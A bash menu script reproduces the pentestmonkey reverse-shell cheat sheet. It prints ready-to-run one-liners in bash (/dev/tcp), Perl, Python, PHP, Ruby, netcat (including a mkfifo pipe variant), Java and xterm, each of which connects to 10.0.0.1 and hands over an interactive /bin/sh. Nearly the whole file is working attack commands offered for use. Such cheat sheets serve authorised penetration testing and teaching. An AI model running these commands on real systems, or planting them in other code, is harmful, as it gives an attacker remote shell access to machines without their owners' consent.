#!/bin/bash

#Source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

answers="BASH PERL PYTHON PHP RUBY NETCAT JAVA XTERM Source_Website Close!"
select choice in $answers
do
case $choice in

	BASH)
		echo && echo 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1' && echo
		;;

	PERL)
		echo && echo "perl -e 'use" && 
			echo "Socket;\$i=\"10.0.0.1\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_" && 
			echo "aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" && echo
		;;


	PYTHON)
                echo && echo "python -c 'import" && 
			echo "socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fil" &&
			echo "eno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" && echo
		;;

	PHP)
		echo && echo "This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…" && 
			echo "php -r '\$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'" && echo
		;;

	RUBY)
		echo && echo "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" && echo
		;;

	NETCAT)
		echo && echo "Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option." && 
			echo "nc -e /bin/sh 10.0.0.1 1234" && 
		echo && echo "If you have the wrong version of netcat installed, Jeff Price points out that you might still be able to get your reverse shell back like this:" &&
			echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f" && echo
		;;

	JAVA)
		echo && echo 'r = Runtime.getRuntime()' && 
			echo 'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"]' &&
			echo "as String[])" && 
			echo "p.waitFor()" && echo
		;;

	XTERM)
		echo && echo "The first command is to be used on the server. It will try to connect back to you on (10.0.0.1) on TCP port 6001" && 
			echo "xterm -display 10.0.0.1:1" && 
		echo && echo "To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):" &&
			echo "Xnest :1" && 
		echo && echo "You’ll need to authorise the target to connect to you (command also run on your host):" && 
			echo "xhost +targetip" && echo
		;;

	Source_Website)
		echo && echo "http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" && echo
		;;

		Close!)
		echo "Goodbye"
		exit
		;;

	*)
		echo "Invalid INPUT: $REPLY"
		;;

esac
done
;;
